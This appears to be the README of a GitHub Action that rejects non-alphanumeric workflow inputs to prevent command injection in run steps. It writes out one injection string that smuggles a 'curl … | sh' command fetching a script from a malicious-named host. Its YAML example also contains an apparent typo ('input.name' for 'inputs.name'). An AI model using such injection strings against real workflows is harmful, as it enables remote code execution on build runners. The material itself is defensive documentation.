# validate-inputs-action

Errors on invalid inputs to github actions.

```yaml
on:
  workflow_dispatch:
    inputs:
      name:
        required: true

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      # errors if name is not alphanumeric
      - uses: jordanst3wart/validate-inputs-action@173efa2db92da9c23f49d84035f0d5b757811f82
        with:
          value: ${{ inputs.name }}
      # safe to call with run commands
      - run: echo "Hello ${{ input.name }}"
```

Normally, if the input for name was `John"; curl https://malicious-software.com/script.sh | sh`, the action would say "Hi John", and then run a malicious script. This validation input errors when the input is not expected.

